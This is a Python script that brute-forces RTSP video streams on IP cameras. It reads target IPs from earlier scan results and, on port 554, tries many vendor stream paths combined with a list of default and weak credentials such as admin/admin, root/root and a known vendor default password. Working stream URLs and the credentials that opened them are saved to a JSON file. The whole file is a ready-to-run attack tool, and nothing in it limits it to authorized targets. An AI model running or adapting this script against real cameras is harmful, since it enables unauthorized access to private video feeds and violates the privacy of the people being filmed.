"""Aggressive RTSP BF - try harder with more paths AND with common creds.

Catches cams that require basic auth but use weak/default passwords.
"""
import socket
import time
import json
import re
import base64
import os
import sys
import csv
import glob
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
import hashlib

# Force unbuffered
sys.stdout.reconfigure(line_buffering=True)

CSV_PATH = None
for f in glob.glob(r'C:\Users\eli6-admin\Documents\**/controllable_Webcams.csv', recursive=True):
    CSV_PATH = f
    break


def md5(s):
    return hashlib.md5(s.encode()).hexdigest()


# Paths to try (most popular first)
PATHS = [
    '/live.sdp',  # HiSilicon
    '/',  # default
    '/live',  # many
    '/live/0/main',  # Uniview
    '/live/0/sub',  # Uniview
    '/av0_0',  # Uniview
    '/Streaming/tracks/101',  # Hikvision
    '/Streaming/Channels/101',  # Dahua
    '/cam/realmonitor',  # Dahua MJPEG
    '/h264/ch1/main/av_stream',  # HiSilicon
    '/h264/ch1/sub/av_stream',  # HiSilicon
    '/11',  # Hipcam main
    '/12',  # Hipcam sub
    '/mpeg4',  # some cams
    '/onvif/streaming/channels/101',  # Sony/ONVIF
    '/trackID=1',  # GeoVision
    '/0/usrnm:pwd/0',  # AirLive
    '/PSIA/Streaming/channels/101',  # PSIA
    '/video1', '/video',  # generic
    '/stream1', '/stream2',  # generic
]

# Common credentials
CREDS = [
    None,  # No auth
    ('admin', ''),
    ('admin', 'admin'),
    ('admin', '12345'),
    ('admin', 'password'),
    ('admin', '1234'),
    ('admin', '1111111'),
    ('admin', '123456'),
    ('admin', 'system'),
    ('admin', 'user'),
    ('admin', 'pass'),
    ('admin', 'Admin12345'),
    ('root', 'root'),
    ('root', ''),
    ('user', 'user'),
    ('guest', 'guest'),
    ('operator', 'operator'),
    ('admin', '7ujMko0admin'),
]


def try_rtsp_with_creds(host, port, path, creds, timeout=3):
    """Try RTSP with creds (Basic auth)."""
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        if creds:
            user, pwd = creds
            url = f'rtsp://{user}:{pwd}@{host}:{port}{path}'
            auth_header = f'Authorization: Basic {base64.b64encode(f"{user}:{pwd}".encode()).decode()}\r\n'
        else:
            url = f'rtsp://{host}:{port}{path}'
            auth_header = ''
        req = f'DESCRIBE {url} RTSP/1.0\r\nCSeq: 1\r\n{auth_header}User-Agent: Mozilla/5.0\r\n\r\n'
        s.send(req.encode())
        data = s.recv(2048)
        s.close()
        if b'200 OK' in data:
            return ('200', url, data[:300].decode('utf-8', errors='replace'))
        if b'401' in data and not creds:
            return ('401', url, '')
        if b'404' in data:
            return ('404', url, '')
        if b'503' in data:
            return ('503', url, '')
        return ('other', url, data[:100].decode('utf-8', errors='replace'))
    except Exception as e:
        return ('err', '', str(e)[:50])


def main():
    csv.field_size_limit(2**31 - 1)
    # Get all IPs with successful RTSP endpoints
    rtsp_ips = set()
    with open('rtsp_endpoints.jsonl', 'r') as f:
        for line in f:
            try:
                r = json.loads(line)
                rtsp_ips.add(r[0])
            except:
                pass
    print(f'[RTSP BF] {len(rtsp_ips)} target IPs')

    # Probe in parallel
    found = []
    with ThreadPoolExecutor(max_workers=30) as ex:
        def probe(ip):
            # Try each path × creds
            for path in PATHS:
                for creds in CREDS:
                    status, url, body = try_rtsp_with_creds(ip, 554, path, creds, timeout=2)
                    if status == '200':
                        return (ip, path, creds, url, body)
                    time.sleep(0.05)  # Rate limit
            return None
        futs = {ex.submit(probe, ip): ip for ip in sorted(rtsp_ips)}
        n_done = 0
        for f in as_completed(futs):
            try:
                r = f.result(timeout=180)
                if r:
                    found.append(r)
            except Exception:
                pass
            n_done += 1
            if n_done % 10 == 0:
                print(f'  {n_done}/{len(rtsp_ips)} probed, {len(found)} working', flush=True)

    print(f'\n[RTSP BF] Working streams: {len(found)}')
    with open('rtsp_full_results_v2.json', 'w', encoding='utf-8') as f:
        # Convert to list format
        out = []
        for ip, path, creds, url, body in found:
            cd = f'{creds[0]}:{creds[1]}' if creds else ''
            out.append([ip, path, cd, body])
        json.dump(out, f, indent=2)

    # Show stats by path
    from collections import Counter
    paths_c = Counter(p for _, p, _, _, _ in found)
    creds_c = Counter((c[0] if c else '') for _, _, c, _, _ in found)
    print(f'\nBy path:')
    for p, c in paths_c.most_common(15):
        print(f'  {p}: {c}')
    print(f'\nBy creds:')
    for cr, c in creds_c.most_common(10):
        print(f'  {cr or "<no-auth>"}: {c}')


if __name__ == '__main__':
    main()
